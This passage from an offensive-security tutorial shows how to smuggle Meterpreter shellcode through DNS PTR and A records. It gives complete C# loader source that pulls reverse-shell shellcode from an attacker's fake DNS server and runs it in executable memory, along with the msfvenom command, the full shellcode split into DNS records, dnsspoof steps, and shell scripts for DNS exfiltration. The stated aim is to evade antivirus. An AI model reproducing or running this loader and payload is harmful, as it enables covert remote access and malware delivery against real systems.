\"0xff0xe70x580x6a0x000x590x490xc70xc20xf00xb50xa20x560xff0xd5.1.com\"\n\r\n\r \n\r\n\r \n\r\n\rNow by this code you can make one Variable with all nslookup output or our Meterpreter Payload by PTR Records .\n\r\n\r DATA += _DATA[i].ToString();\n\r\n\r \n\r\n\rso by this code we have something like this :\n\r\n\rDATA = “0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com” + \"0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com\" + \"0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com\" + \"0x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x41.1.com\" + ….. + \"0x570x590x410xba0x750x6e0x4d0x610xff0xd50x490xff0xce0xe90x3c.1.com\" + \"0xff0xff0xff0x480x010xc30x480x290xc60x480x850xf60x750xb40x41.1.com\" + \"0xff0xe70x580x6a0x000x590x490xc70xc20xf00xb50xa20x560xff0xd5.1.com\"\n\r\n\ror \n\r\n\rDATA = “0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com0x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x41.1.com…0x570x590x410xba0x750x6e0x4d0x610xff0xd50x490xff0xce0xe90x3c.1.com0xff0xff0xff0x480x010xc30x480x290xc60x480x850xf60x750xb40x41.1.com\"0xff0xe70x580x6a0x000x590x490xc70xc20xf00xb50xa20x560xff0xd5.1.com\"\n\r\n\r  \n\r\n\rCode 3:\n\r\n\rin this step of code we should make Payload by this Variable “DATA” so for doing this first of all we can use “split()” for chunking Payloads .\n\r\n\rstring[] Payload__Without_delimiterChar = DATA.Split(\'x\');\n\r\n\r                object tmp = new object();\n\r\n\r                byte[] __Bytes = new byte[DATA.Length / 4];\n\r\n\r                for (int i = 1; i &lt; __Bytes.Length; i++)\n\r\n\r                {\n\r\n\r                    tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);\n\r\n\r                    byte current = Convert.ToByte(\"0x\" + tmp.ToString(), 16);\n\r\n\r                    __Bytes[i] = current;\n\r\n\r                }\n\r\n\r“0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com0x510x560”\n\r\n\r string[] Payload__Without_delimiterChar = DATA.Split(\'x\');\n\r\n\rso by this code our DATA will transform to this \n\r\n\r0 , fc0 , 480 , 830 , e40 , f00 , e80 , cc0 , 000 , 000 , 000 , 410 , 510 , 410 , 500 , 52.1.com0 , 510 , 560\n\r\n\ralso you can see this technique by “split()” in Picture “Code 3-1” Code 3-1: \n\r\n\r\n\r\n\r \n\r\n\rExample C#_Code1 :\n\r\n\rstring[] Payload__Without_delimiterChar = DATA.Split(\'x\');\n\r\n\r                object tmp = new object();\n\r\n\r                byte[] __Bytes = new byte[DATA.Length / 4];\n\r\n\r                for (int i = 1; i &lt; __Bytes.Length; i++)\n\r\n\r                {\n\r\n\r                    tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);\n\r\n\r                    byte current = Convert.ToByte(\"0x\" + tmp.ToString(), 16);\n\r\n\r                    __Bytes[i] = current;\n\r\n\r                }\n\r\n\rin next picture “Code 3-2” I will explain why I used “DATA.Lentgth / 4” , this is important because we want make one variable for our Payloads with Bytes[] Type so we should know what is our Length for this Meterpreter Payload so for figure out this just need to see Picture “Code 3-2” in this Picture you can see we have 4 strings between each “x” : \n\r\n\rit means 3 strings + x = 4 strings\n\r\n\r “0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com0x510x560”\n\r\n\ralso you can use this Example C#_Code2 if you got ERROR with this Example C#_Code1.\n\r\n\rExample C#_Code2 : \n\r\n\rstring[] Payload__Without_delimiterChar = DATA.Split(\'x\');\n\r\n\r                object tmp = new object();\n\r\n\r                byte[] __Bytes = new byte[Payload__Without_delimiterChar .Length];\n\r\n\r                for (int i = 1; i &lt; __Bytes.Length; i++)\n\r\n\r                {\n\r\n\r                    tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);\n\r\n\r                    byte current = Convert.ToByte(\"0x\" + tmp.ToString(), 16);\n\r\n\r                    __Bytes[i] = current;\n\r\n\r                }\n\r\n\r \n\r\n\rok both of these codes will work very well but we have one problem by this Code so I will explain where is Problem , the problem is first string in this Payload .\n\r\n\r“0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com0x510x560”\n\r\n\ras you can see in Picture “Code3-1” after this code \n\r\n\rstring[] Payload__Without_delimiterChar = DATA.Split(\'x\'); \n\r\n\rour String Array Variable started by 0 in Payload__Without_delimiterChar [0].\n\r\n\rPayload__Without_delimiterChar [0] = 0\n\r\n\rPayload__Without_delimiterChar [1] = fc0           &lt;=== Meterpreter Payload Started from this Value\n\r\n\rPayload__Without_delimiterChar [2] = 480\n\r\n\r \n\r\n\rso this Byte will make Problem because this is my bug ;D in my code and this is not section of Meterpreter Payload so how can fix this ? \n\r\n\rYou can fix it by assigning value 1 to I.\n\r\n\r  for (int i = 1; i &lt; __Bytes.Length; i++)\n\r\n\r                {\n\r\n\r                    tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);\n\r\n\r                    byte current = Convert.ToByte(\"0x\" + tmp.ToString(), 16);\n\r\n\r                    __Bytes[i] = current;\n\r\n\r                }\n\r\n\ras you can see in Picture Code 3-3 this trick worked very well and you have Correct Payload in your Byte Array variable and in picture “Code 3-2” you can see “Section A” for creating Thread by this Byte Array Variable in this case “__Bytes” so about how this “Section A” worked we Talked in previous chapters especially in “Chapter 1” . \n\r\n\rCode 3-2:\n\r\n\r Code 3-3 \n\r\n\rUsing this method on Linux systems only : NativePayload_DNS.sh Script and Linux systems\n\r\n\rnow in this Part of this chapter I want to talk about this Method on Linux systems only so in this case I made 2 scripts for this method first for Make DNS PTR Records via Host.txt file , second is NativePayload_DNS.sh Script for Dump/Download DATA via DNS PTR records.\n\r\n\rNote : in this case I used these Scripts to Dump/Download “Text” as DATA via DNS PTR Records .\n\r\n\rAs you can see in the next picture I used these two Scripts on two Linux systems .\n\r\n\rUsing Scripts Step by step :\n\r\n\rStep 1 (system A) : first of all you need to Create one Host file as DNS Records to use by “Dnsspoof” tool so for make it you can use this Script “DnsHostCreator.sh“\n\r\n\r\n\r\n\rto use this Script your syntax is this :\n\r\n\rsyntax : ./DnsHostCreator.sh  SourceTextFile.txt  DomainName  ChunkNumber\n\r\n\rExample 1 : ./DnsHostCreator.sh  1.txt  microsoft.com  10 &gt; host.txt\n\r\n\rin this case in file “1.txt” I have this text “Transferring DATA via DNS PTR Records ;).” and with “Example 1” I will have something like these lines in “host.txt” \n\r\n\rFile host.txt :\n\r\n\r192.168.1.6 temp.microsoft.com\n\r\n\r# injecting this text via this host.domain:  Transferri  ==&gt;  5472616e736665727269.microsoft.com\n\r\n\r192.168.1.0 5472616e736665727269.microsoft.com\n\r\n\r# injecting this text via this host.domain:  ng DATA vi  ==&gt;  6e672044415441207669.microsoft.com\n\r\n\r192.168.1.1 6e672044415441207669.microsoft.com\n\r\n\r# injecting this text via this host.domain:  a DNS PTR  ==&gt;  6120444e532050545220.microsoft.com\n\r\n\r192.168.1.2 6120444e532050545220.microsoft.com\n\r\n\r# injecting this text via this host.domain:  Records ;)  ==&gt;  5265636f726473203b29.microsoft.com\n\r\n\r192.168.1.3 5265636f726473203b29.microsoft.com\n\r\n\r# injecting this text via this host.domain:  .  ==&gt;  2e.microsoft.com\n\r\n\r192.168.1.4 2e.microsoft.com\n\r\n\r \n\r\n\ras you can see these Text Injected to “Hosts” for Domain “microsoft.com” it means : \n\r\n\rhost  =  text   == &gt;    5472616e736665727269 =  Transferri\n\r\n\rinjecting this text via this host.domain:  Transferri  ==&gt;  5472616e736665727269.microsoft.com\n\r\n\rStep 1-2 (system A) :  now you should make Fake DNS Server by this file “host.txt” via dnsspoof tool\n\r\n\rExample 1-2 : ./dnsspoof -f host.txt\n\r\n\rStep 2 (system B) : now in this Step you can Download these Injected Text to Host-Name for domain “microsoft.com from “system A” to “system B” with this syntax :\n\r\n\rsyntax : ./NativePayload_DNS.sh  DomainName TargetDNSServer Delay(sec)\n\r\n\rExample 2 : ./NativePayload_DNS.sh   microsoft.com   192.168.56.1   2 \n\r\n\r\n\r\n\rDnsHostCreator.sh , Script Code :\n\r\n\r #!/bin/sh\n\r\n\r# syntax0 : ./DnsHostCreator.sh SourceTextFile.txt DomainName ChunkNumber\n\r\n\r# syntax0 : ./DnsHostCreator.sh text.txt Test.com 20 &gt; myhost.txt\n\r\n\r# Example : dnsspoof -f myhost.txt\n\r\n\recho \"DnsHostCreator.sh v1.0 , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting DATA to DNS Traffic via DNS PTR Records and Host.txt\"\n\r\n\recho \"\"\n\r\n\rcu=0\n\r\n\rfor op in `xxd -p -c $3 $1`; do\n\r\n\r((cu++))\n\r\n\rdone\n\r\n\r((cu++))\n\r\n\recho 192.168.1.$cu \"temp.$2\" \n\r\n\rx=0\n\r\n\rfor ops in `xxd -p -c $3 $1`; do\n\r\n\r Exfil=$ops\n\r\n\r t=`echo $Exfil | xxd -r -p`\n\r\n\r echo \"# injecting this text via this host.domain: \" $t \" ==&gt; \" $Exfil.$2\n\r\n\r echo 192.168.1.$x \"$Exfil.$2\" \n\r\n\r((x++))\n\r\n\rdone\n\r\n\r \n\r\n\r \n\r\n\rNativePayload_DNS.sh , Script Code :\n\r\n\r #!/bin/sh\n\r\n\r# syntax ./NativePayload_DNS.sh DomainName TargetDNSServer delay\n\r\n\r# syntax ./NativePayload_DNS.sh test.com 192.168.1.10 3\n\r\n\rtput setaf 2;\n\r\n\recho \"NativePayload_DNS.sh v1.0 , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Exfil/Infiltration/Transferring DATA via DNS PTR Records\"\n\r\n\recho \"\"\n\r\n\rtemp=`nslookup temp.$1 $2 | grep Add | awk {\'print $2\'}`\n\r\n\rtemp2=`echo $temp | awk {\'print $2\'}`\n\r\n\recho \"[!] Detecting Temp host: \"$temp2\n\r\n\rmyloops=`echo $temp2 | cut -d\'.\' -f4`\n\r\n\recho \"[!] Detecting PTR Records/Requests: \"$myloops\n\r\n\rfirst_ip=\"`echo $temp2 | cut -d\'.\' -f1`\"\n\r\n\rfirst_ip+=\".`echo $temp2 | cut -d\'.\' -f2`\"\n\r\n\rfirst_ip+=\".`echo $temp2 | cut -d\'.\' -f3`.\"\n\r\n\recho \"[!] Detecting First Request: \"$first_ip\"x\"\n\r\n\recho \"[!] Delay time (sec): \"$3\n\r\n\rcounter=0\n\r\n\rtimedelay=0\n\r\n\ralldumps=``;\n\r\n\rwhile(true)\n\r\n\rdo\n\r\n\r        echo \"--------------------------\"\n\r\n\r        first_ip=\"`echo $temp2 | cut -d\'.\' -f1`\"\n\r\n\r        first_ip+=\".`echo $temp2 | cut -d\'.\' -f2`\"\n\r\n\r        first_ip+=\".`echo $temp2 | cut -d\'.\' -f3`.$counter\"\n\r\n\r        tput setaf 2;\n\r\n\r        time=`date \'+%d/%m/%y %H:%M:%S\'`\n\r\n\r        echo \"[!] \"[$counter] [$time] \" Lookup : \" $first_ip  \n\r\n\r        tput setaf 11;\n\r\n\r        final= echo \"[!] \"[$counter]\" Domain: \"  \"`nslookup $first_ip $2 | grep arpa | awk {\'print $4\'}`\"\n\r\n\r        tput setaf 3;\n\r\n\r        finals= echo \"[!] \"[$counter]\" Text: \"  \"`nslookup $first_ip $2 | grep arpa | awk {\'print $4\'} | xxd -r -p`\"\n\r\n\r        alldumps+=\"`nslookup $first_ip $2 | grep arpa | awk {\'print $4\'} | xxd -r -p`\"\n\r\n\r        tput setaf 10;\n\r\n\r        echo \"[&gt;] \"[$counter]\" Dumped DATA : \" $alldumps\n\r\n\r        ((counter++))\n\r\n\r        sleep $3\n\r\n\r                if(($counter == $myloops))\n\r\n\r                then\n\r\n\r                break\n\r\n\r                fi\n\r\n\rdone\n\r\n\r \n\r\n\rNativePayload_DNS.exe , C# Code :\n\r\n\rSupported only in .NET Framework  2.0 , 3.0 , 3.5 , 4.0\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Diagnostics;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_DNS\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            string _DnsServer = \"192.168.1.50\";\n\r\n\r            /// 1.1.1.{x} ==&gt; x = 0 ... 33 \n\r\n\r            string _IPaddress_Begin = \"1.1.1.\";\n\r\n\r            int _IPaddress_Counter = 34;\n\r\n\r            /// \n\r\n\r            /// step 1:\n\r\n\r            /// msfvenom C type payload in your kali linux\n\r\n\r            /// msfvenom -platform windows arch x86_64 p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 f c &gt; /root/Desktop/payload.txt\n\r\n\r            /// copy payloads from payload.txt file to dns.txt like this format:\n\r\n\r            /// \n\r\n\r            /// \n\r\n\r            /// root@kali:~# cat /root/Desktop/dns.txt\n\r\n\r            ///\n\r\n\r            ///1.1.1.0 \"0xfc0x480x830xe40xf00xe80xcc0x000x000x000x410x510x410x500x52.1.com\"\n\r\n\r            ///1.1.1.1 \"0x510x560x480x310xd20x650x480x8b0x520x600x480x8b0x520x180x48.1.com\"\n\r\n\r            ///1.1.1.2 \"0x8b0x520x200x480x8b0x720x500x480x0f0xb70x4a0x4a0x4d0x310xc9.1.com\"\n\r\n\r            ///1.1.1.3 \"0x480x310xc00xac0x3c0x610x7c0x020x2c0x200x410xc10xc90x0d0x41.1.com\"\n\r\n\r            ///1.1.1.4 \"0x010xc10xe20xed0x520x410x510x480x8b0x520x200x8b0x420x3c0x48.1.com\"\n\r\n\r            ///1.1.1.5 \"0x010xd00x660x810x780x180x0b0x020x0f0x850x720x000x000x000x8b.1.com\"\n\r\n\r            ///1.1.1.6 \"0x800x880x000x000x000x480x850xc00x740x670x480x010xd00x500x8b.1.com\"\n\r\n\r            ///1.1.1.7 \"0x480x180x440x8b0x400x200x490x010xd00xe30x560x480xff0xc90x41.1.com\"\n\r\n\r            ///1.1.1.8 \"0x8b0x340x880x480x010xd60x4d0x310xc90x480x310xc00xac0x410xc1.1.com\"\n\r\n\r            ///1.1.1.9 \"0xc90x0d0x410x010xc10x380xe00x750xf10x4c0x030x4c0x240x080x45.1.com\"\n\r\n\r            ///1.1.1.10 \"0x390xd10x750xd80x580x440x8b0x400x240x490x010xd00x660x410x8b.1.com\"\n\r\n\r            ///1.1.1.11 \"0x0c0x480x440x8b0x400x1c0x490x010xd00x410x8b0x040x880x480x01.1.com\"\n\r\n\r            ///1.1.1.12 \"0xd00x410x580x410x580x5e0x590x5a0x410x580x410x590x410x5a0x48.1.com\"\n\r\n\r            ///1.1.1.13 \"0x830xec0x200x410x520xff0xe00x580x410x590x5a0x480x8b0x120xe9.1.com\"\n\r\n\r            ///1.1.1.14 \"0x4b0xff0xff0xff0x5d0x490xbe0x770x730x320x5f0x330x320x000x00.1.com\"\n\r\n\r            ///1.1.1.15 \"0x410x560x490x890xe60x480x810xec0xa00x010x000x000x490x890xe5.1.com\"\n\r\n\r            ///1.1.1.16 \"0x490xbc0x020x000x110x5c0xc00xa80x010x320x410x540x490x890xe4.1.com\"\n\r\n\r            ///1.1.1.17 \"0x4c0x890xf10x410xba0x4c0x770x260x070xff0xd50x4c0x890xea0x68.1.com\"\n\r\n\r            ///1.1.1.18 \"0x010x010x000x000x590x410xba0x290x800x6b0x000xff0xd50x6a0x05.1.com\"\n\r\n\r            ///1.1.1.19 \"0x410x5e0x500x500x4d0x310xc90x4d0x310xc00x480xff0xc00x480x89.1.com\"\n\r\n\r            ///1.1.1.20 \"0xc20x480xff0xc00x480x890xc10x410xba0xea0x0f0xdf0xe00xff0xd5.1.com\"\n\r\n\r            ///1.1.1.21 \"0x480x890xc70x6a0x100x410x580x4c0x890xe20x480x890xf90x410xba.1.com\"\n\r\n\r            ///1.1.1.22 \"0x990xa50x740x610xff0xd50x850xc00x740x0a0x490xff0xce0x750xe5.1.com\"\n\r\n\r            ///1.1.1.23 \"0xe80x930x000x000x000x480x830xec0x100x480x890xe20x4d0x310xc9.1.com\"\n\r\n\r            ///1.1.1.24 \"0x6a0x040x410x580x480x890xf90x410xba0x020xd90xc80x5f0xff0xd5.1.com\"\n\r\n\r            ///1.1.1.25 \"0x830xf80x000x7e0x550x480x830xc40x200x5e0x890xf60x6a0x400x41.1.com\"\n\r\n\r            ///1.1.1.26 \"0x590x680x000x100x000x000x410x580x480x890xf20x480x310xc90x41.1.com\"\n\r\n\r            ///1.1.1.27 \"0xba0x580xa40x530xe50xff0xd50x480x890xc30x490x890xc70x4d0x31.1.com\"\n\r\n\r            ///1.1.1.28 \"0xc90x490x890xf00x480x890xda0x480x890xf90x410xba0x020xd90xc8.1.com\"\n\r\n\r            ///1.1.1.29 \"0x5f0xff0xd50x830xf80x000x7d0x280x580x410x570x590x680x000x40.1.com\"\n\r\n\r            ///1.1.1.30 \"0x000x000x410x580x6a0x000x5a0x410xba0x0b0x2f0x0f0x300xff0xd5.1.com\"\n\r\n\r            ///1.1.1.31 \"0x570x590x410xba0x750x6e0x4d0x610xff0xd50x490xff0xce0xe90x3c.1.com\"\n\r\n\r            ///1.1.1.32 \"0xff0xff0xff0x480x010xc30x480x290xc60x480x850xf60x750xb40x41.1.com\"\n\r\n\r            ///1.1.1.33 \"0xff0xe70x580x6a0x000x590x490xc70xc20xf00xb50xa20x560xff0xd5.1.com\"\n\r\n\r            ///\n\r\n\r            /// step 2: Make Fake DNS server in your kali linux\n\r\n\r            ///root@kali:~# dnsspoof -i eth0 -f /root/Desktop/dns.txt\n\r\n\r            /// step 3:\n\r\n\r            /// run code in client\n\r\n\r            /// syntax: NativePayload_DNS.exe \"1.1.1.\" 34 \"192.168.1.50\"\n\r\n\r            /// finally you can bypass AVs and you have Meterpreter Session\n\r\n\r            ///\n\r\n\r \n\r\n\r            try\n\r\n\r            {\n\r\n\r                /// IP Address for Resolve ==&gt; IPAddress to FQDN\n\r\n\r                _IPaddress_Begin = args[0].ToString();\n\r\n\r                /// Number for Counter\n\r\n\r                /// for example 1.1.1. by 34 ==&gt; 1.1.1.0 , 1.1.1.1 ,  .... , 1.1.1.32 , 1.1.1.33\n\r\n\r                _IPaddress_Counter = Convert.ToInt32(args[1]);\n\r\n\r                /// Attacker Fake DNS Server \n\r\n\r                _DnsServer = args[2].ToString();\n\r\n\r            }\n\r\n\r            catch (Exception err)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"\");\n\r\n\r                Console.WriteLine(\"Command Syntax : NativePayload_DNS.exe \\\"StartIpaddress\\\" counter_Number_of_Records \\\"FakeDNS_Server\\\" \");\n\r\n\r                Console.WriteLine(\"Command Syntax : NativePayload_DNS.exe \\\"1.1.1.\\\" 34 \\\"192.168.1.50\\\" \");\n\r\n\r                Console.WriteLine(\"for more information please visit github account for this tool\");\n\r\n\r                Console.WriteLine(\"\");\n\r\n\r                Console.WriteLine(\"\");\n\r\n\r                Console.WriteLine(\"[1] error: {0}\", err.Message);\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            }\n\r\n\r            try\n\r\n\r            {\n\r\n\r                string[] _DATA = new string[_IPaddress_Counter];\n\r\n\r                string DATA = \"\";\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.WriteLine(\"NativePayload_DNS by Damon Mohammadbagher\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.WriteLine(\"Starting Download Backdoor Payloads by DNS Traffic from FakeDNS_Server\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.WriteLine(\"DNS Server: {0} \", _DnsServer);\n\r\n\r                for (int i = 0; i &lt; _IPaddress_Counter; i++)\n\r\n\r                {\n\r\n\r                    _DATA[i] = __nslookup(_IPaddress_Begin + i, _DnsServer);\n\r\n\r                    DATA += _DATA[i].ToString();\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                    Console.WriteLine(\"DNS Request Send: {0}\", (_IPaddress_Begin + i).ToString());\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine(\"DNS Response type PTR Record: {0}\", _Records);\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                }\n\r\n\r                string[] Payload__Without_delimiterChar = DATA.Split(\'x\');\n\r\n\r                object tmp = new object();\n\r\n\r                byte[] __Bytes = new byte[DATA.Length / 4];\n\r\n\r                for (int i = 1; i &lt; __Bytes.Length; i++)\n\r\n\r                {\n\r\n\r                    tmp = Payload__Without_delimiterChar[i].ToString().Substring(0, 2);\n\r\n\r                    byte current = Convert.ToByte(\"0x\" + tmp.ToString(), 16);\n\r\n\r                    __Bytes[i] = current;\n\r\n\r                }\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by DNS traffic ;)\");\n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)__Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(__Bytes, 0, (IntPtr)(funcAddr), __Bytes.Length);\n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r            }\n\r\n\r            catch (Exception err2)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r                Console.WriteLine(\"[2] error: {0}\", err2.Message);\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            }\n\r\n\r        }\n\r\n\r        public static string _Records = \"\";\n\r\n\r        public static string __nslookup(string DNS_PTR_A, string DnsServer)\n\r\n\r        {           \n\r\n\r            /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_PTR_A + \" \" + DnsServer);\n\r\n\r            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r            ns_Prcs_info.UseShellExecute = false;\n\r\n\r            // you can use Thread Sleep here \n\r\n\r \n\r\n\r            Process nslookup = new Process();\n\r\n\r            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r            nslookup.Start();\n\r\n\r \n\r\n\r            /// if you want to change your Domain Name from \"1.com\" to \"22.com\"\n\r\n\r            /// then you should change these Settings and Values too ;)\n\r\n\r            string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r            string[] lines = computerList.Split(\'\\r\', \'n\');\n\r\n\r            string last_line = lines[lines.Length - 4];\n\r\n\r            string temp_1 = last_line.Remove(0, 11);\n\r\n\r            _Records = \"\\\"\" + temp_1;\n\r\n\r            int i = temp_1.LastIndexOf(\'.\');\n\r\n\r            string temp_2 = temp_1.Remove(i, (temp_1.Length - i));\n\r\n\r            int b = temp_2.LastIndexOf(\'.\');\n\r\n\r            string final = temp_2.Remove(b, temp_2.Length - b);\n\r\n\r            return final;\n\r\n\r        }\n\r\n\r \n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);       \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}","","topics\\Chapter 3.html","\n\r\n\rChapter 4 : DATA Transferring Technique by DNS Traffic (A Records)\n\r\n\r\n\r•Goal : Understanding this technique by C# \n\r\n\r\n\r•Demo : C# Code “NativePayload_DNS2” Step by step. \n\r\n\r\n\r \n\r\n\r \n\r\n\rPART1 , Understanding this technique by C# \n\r\n\r \n\r\n\rIn this chapter I want to explain how can bypass anti-viruses without encryption method for payloads or Hard-Coded Payload in Backdoor Source Code so in this chapter I want to talk about DATA Transfer Technique and In this technique I want to use DNS protocol with “A Records” for Transfer my backdoor payloads from attacker computer to Client computer so in this case we need one backdoor code without hard-coded Payload or encrypted Payload.\n\r\n\rTherefore risk for detection by Anti-Viruses is very low in this case. Because our Meterpreter Payloads will be in Network Traffic  and Target System Memory only .\n\r\n\rWhy DNS protocol?\n\r\n\rBecause DNS traffic in the most networks are available without monitoring or Filtering by IPS/IDS or hardware firewalls .\n\r\n\rIn this article I want to show you one way to hide “Infiltration/Exfiltration” your payloads by DNS Request/Response over Network.\n\r\n\rWhere is vulnerability point in this case?\n\r\n\rWhen you want to use Payloads without encryption or Hard coded Payloads in your backdoor file or (File-systems) you need to transfer Payloads over Network from your system to target computer by some Protocol like HTTP and DNS or … , in this case we want to transfer these Payloads over DNS Traffic also execute these Payloads in Target computer memory so vulnerability point is Payload location and vulnerability point is Anti-viruses methods for Detecting Malware. Because in this case we don’t have Payloads via File-systems so we have Payload in memory and Network Traffic (in this case DNS A Records Traffic).\n\r\n\rImportant Point : in this technique I want to use IPv4 addresses “w.x.y.z” for Meterpreter Payloads so detecting this technique is very Hard and Very important .\n\r\n\r \n\r\n\rBackdoor Payloads in DNS Zone with A records :\n\r\n\rNow we should talk about DNS records step by step for understanding this Technique.\n\r\n\rExample: \n\r\n\rHost                                    Record-Type                             value\n\r\n\rMicrosoft.com                        A                                           192.168.1.1\n\r\n\rMicrosoft.com                        A                                           192.168.1.2\n\r\n\rMicrosoft.com                        A                                           192.168.1.3\n\r\n\rMicrosoft.com                        A                                           192.168.1.4\n\r\n\r \n\r\n\rDNS Zone 1: Simple DNS Zone.\n\r\n\ras you can see in “DNS Zone 1” we have four A records for Domain Name Microsoft.com. \n\r\n\rWhy I used Domain Name “Microsoft.com” ? \n\r\n\rBecause this Domain is Valid Domain Name.\n\r\n\rIf you want to use these A records for your payloads then how these Values in A records will Help you as Attacker ?\n\r\n\rIt is Important Question and Important Point for This Technique so let me explain this Idea with More information then we can talk about this Technique step by step .\n\r\n\rFirst of all we should know about A records so this is example of A Record :\n\r\n\rMicrosoft.com     A    192.168.1.1\n\r\n\rfor each A Record we have W.X.Y.Z octets for IPv4 Address now just we need to think about W.X.Y. and Z also this Question:\n\r\n\rHow can I use these Octets to Hiding My Payloads or How an Attacker Can do this ? \n\r\n\rfirst of all you should think as Attacker for doing this also we should think about Defense against this Threat .\n\r\n\rIn my opinion this is very simple , It means Really Simple , How ?\n\r\n\rFirst I need Payload so this is my Meterpreter Payload with (6 bytes)\n\r\n\rMsfvenom Meterpreter Payload :  fc 48 83 e4 f0 e8 cc 00 00 00 41 51 41 50 52 ...\n\r\n\rnow you should think about how can Convert these Bytes to IPv4 address by 4 octets ?\n\r\n\rIt means : Injecting our Codes to IPv4 Addresses\n\r\n\rInjecting Payloads Bytes to IPv4 Address : {W.X.Y}.Z\n\r\n\rInjecting Payloads { FC 48 83 E4 F0 E8 } to IPv4 Address : {Payload}.Z\n\r\n\rIPAddress 0 = fc.48.83.0 \n\r\n\rIPAddress 1 = e4.f0.e8.1 \n\r\n\rNote: Z is counter\n\r\n\ras I said now we should think as an attacker for this question how can Injecting our Codes to IPv4 Address ?\n\r\n\rSo for doing this like “Picture 1: Code 1” I had these Codes so let me explain them one by one with C# Codes.\n\r\n\rExplaining Code Lines :\n\r\n\r \n\r\n\rpublic static string SortIPAddress(string _Payload,string MainIP, string String_DomainName)\n\r\n\r        {\n\r\n\r            string[] X = _Payload.Split(\',\');\n\r\n\r            string[] XX = new string[X.Length / 3];\n\r\n\r            int counter = 0;\n\r\n\r            int X_counter = 0;\n\r\n\r            string tmp = \"\";\n\r\n\r            Console.WriteLine();\n\r\n\r            for (int i = 0; i &lt; X.Length;)\n\r\n\r            {\n\r\n\r                tmp += X[i]+\",\";\n\r\n\r                i++;\n\r\n\r                counter++;\n\r\n\r                if (counter &gt;= 3)\n\r\n\r                {\n\r\n\r                    counter = 0;\n\r\n\r                    XX[X_counter] = tmp.Substring(0,tmp.Length-1);\n\r\n\r                    X_counter++;\n\r\n\r                    tmp = \"\";\n\r\n\r                }\n\r\n\r            }\n\r\n\rline100: by this code  string[] X = _Payload.Split(\',\');  you can have your payloads by one String Array with Chunked Payloads.\n\r\n\rFc,48,83,e4,f0,e8 ==&gt;  \n\r\n\rX[0] =  “fc” \n\r\n\rX[1] = “48”\n\r\n\rX[2] = “83” \n\r\n\rX[3] = “e4” \n\r\n\rX[4] = “f0” \n\r\n\rX[5] = “e8”\n\r\n\rso idea is Chunking these PAYLOADS from Variable “_Payload” to “X” by Array then by 